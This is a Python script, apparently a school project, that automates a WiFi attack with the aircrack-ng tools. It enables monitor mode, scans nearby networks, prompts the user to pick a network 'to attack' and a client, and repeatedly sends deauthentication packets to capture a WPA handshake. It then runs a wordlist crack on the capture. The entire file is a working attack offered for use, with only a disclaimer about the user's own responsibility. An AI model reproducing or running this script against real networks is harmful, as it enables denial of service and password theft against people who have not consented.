from os import system
import os
import subprocess as sub
import time
import csv
import re

wireless_card = 'wlan0'
mon_card = wireless_card + 'mon'
file = 'data'


def if_config(wireless_card):
    ifconfig = 'ifconfig {0} up'.format(wireless_card)
    system(ifconfig)
    time.sleep(1)
    ifconfig = 'ifconfig {0} down'.format(wireless_card)
    system(ifconfig)
    time.sleep(1)


def iw_config(wireless_card,channel):
    iwconfig = 'iwconfig {0} channel{1}'.format(mon_card,channel)
    system(iwconfig)
    print iwconfig
    time.sleep(1)


def air_mon(wireless_card, channel=None):
    # airkill = 'airmon-ng check kill'
    # system(airkill)
    airmon = 'airmon-ng start {0} {1}'.format(wireless_card, channel)
    print ('monetor Mode have been enbled on channel {0}').format(channel)
    system(airmon)
    time.sleep(1)


def airodump_ng(mon_card, file):
   # airodump = 'screen -d -m airodump-ng {0} -w {1}'.format(mon_card,file)
    #print airodump
    #system(airodump)
    p = sub.Popen(['airodump-ng', 'wlan0mon', '-w' + file])
    time.sleep(10)
    p.kill()


def airodump_ng_screen(mon_card, file):
    airodump = 'screen -d -m airodump-ng {0} -w {1}'.format(mon_card,file)
    print airodump
    system(airodump)


# def beacons_snif(bssid, ch, essid):
#    airodump_snif= 'a irodump-ng --bssid {0} -c {1} --write beacons{2} '.format(bssid,ch,essid)
#    # system(airodump_snif)
#    p= sub.Popen(['airodump-ng','wla n0mon','--b ssid',bssid, '-c',ch, '-w beacons --output-format txt'])
# p= sub.Popen(['airodump-ng','--bssid{Bss}', '--write beacons{essid}'])
# p.format
#    time.sleep(30)
#    p.kill()


def aire_play(bssid, station):
   # p_aire_play = sub.Popen(['aireplay-ng', '--deauth 15 ', '-a ', bssid, '-c ', station, mon_card])
    cmd_aire = 'aireplay-ng --deauth 10 -a {0} -c {1} {2}' .format(bssid, station, mon_card)
    print cmd_aire
    system(cmd_aire)

def air_crack(file, path_to_list):
    p_aire_play = sub.Popen(['aircrack-ng', file, '-w', path_to_list])


def parse_csv(file, *fnames):
    names = []
    for name in fnames:
        names.append(name)

    # df = pd.read_csv(file, usecols=names, delimiter=";")
    df = csv.DictReader(open(file, 'r'))
    print(fnames)
    vals = []
    for line in df:
        t = {}
        for fname in fnames:
            name = fname if fname not in line.keys() else fname
            if name not in line.keys():
                continue
            t[fname] = line[name].strip()
        vals.append(t)
    return vals


def parse_csv_ver2(file):

    with open (file,'r') as csv_file:
        csv_reader = csv.reader(csv_file)
        i=0
        vals = []
        for line in csv_reader:

            vals.append(line)
            print (i,line)
            i += 1
        return vals

def delete_old_data(exiest_file):
	if os.path.exists('./data-01.csv'):
        	os.remove('./data-01.csv')
        	os.remove('./data-01.cap')
        	os.remove('./data-01.kismet.netxml')
        	os.remove('./data-01.log.csv')
        	os.remove('./data-01.kismet.csv')


def main():
    print("This Project Have been done For School , you use its on our own resbonsiblity")

    #  #wireless_card= raw_input("Enter oyur wirless card :")

    delete_old_data('./data-01.csv')

    print(wireless_card)
    print(mon_card)
    if_config(wireless_card)
    air_mon(wireless_card)
    #system('xfce4-terminal --tab python airmon_auto.py')  # open new shell?
    airodump_ng(mon_card, file)
    work_file = ('data-01.csv')
    #data = parse_csv(work_file, 'BSSID', 'channel', 'Station MAC')
    data = parse_csv_ver2(work_file)
    ssid = input("Enter the lan that you would like to attack (click the number) :")
    bssid_atc_temp = data[ssid]
    bssid_atc = bssid_atc_temp[0]
    staion = input("Enter the station :")
    staion_atc_temp = data[staion]
    staion_atc = staion_atc_temp[0]
    channel = bssid_atc_temp[3]
    print bssid_atc
    print staion_atc
    print channel
    delete_old_data('./data-01.csv')
    airodump_ng_screen(mon_card, file)
    for i in range(10):

	  iw_config(mon_card,channel)
    	  air_mon(wireless_card, channel)
          aire_play(bssid_atc, staion_atc)
    system ('screen -r')
    air_crack('./data-01.cap', './num_list.txt')
# TODO implement ival of input???


if __name__ == '__main__':
    main()

